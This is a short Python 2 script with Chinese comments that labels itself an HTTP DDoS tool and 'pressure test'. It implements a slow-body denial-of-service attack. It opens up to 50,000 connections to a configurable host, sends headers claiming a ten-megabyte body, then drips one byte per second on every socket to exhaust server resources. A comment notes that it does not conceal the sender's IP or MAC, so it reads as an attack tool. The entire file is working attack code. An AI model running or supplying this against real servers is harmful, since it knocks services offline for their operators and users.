#!/usr/bin/env python  
#coding=utf-8
#基于http的ddos，没有擦掉自己的源ip和mac，慎用...
import socket  
import time  
import threading  
#Pressure Test,ddos tool  
#---------------------------  
MAX_CONN=50000 	#请求次数 
PORT=80		#请求端口
HOST="127.0.0.1"  	#请求主机(或域名)
PAGE="/index.html"  	#请求页面(应为PHP之类的动态页面)
#---------------------------  

#构造的请求报文(此处为POST,没有报文的body部分)
buf=("GET %s HTTP/1.1\r\n"  
"Host: %s\r\n"  
"Content-Length: 10000000\r\n"  
"Cookie: dklkt_dos_test\r\n"  
"\r\n" % (PAGE,HOST))  

#套接字列表  
socks=[]  

#定义请求流程  
def conn_thread():  
    global socks  
    for i in range(0,MAX_CONN):  
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
        try:  
            s.connect((HOST,PORT))  
            s.send(buf)  
            print "Send buf OK!,conn=%d\n"%i  
            socks.append(s)  
        except Exception,ex:  
            print "Could not connect to server or send error:%s"%ex  
            time.sleep(10)  

#定义请求流程  
def send_thread():  
    global socks  
    while True:  
        for s in socks:  
            try:  
                s.send("f")  		#超过一定时间(10S)之后在发送报文的body部分字符串...
                #print "send OK!"  
            except Exception,ex:  
                print "Send Exception:%s\n"%ex  
                socks.remove(s)  
                s.close()  
        time.sleep(1)  

#线程方式  
conn_th=threading.Thread(target=conn_thread,args=())  
send_th=threading.Thread(target=send_thread,args=())  

#执行线程  
conn_th.start()  
send_th.start() 
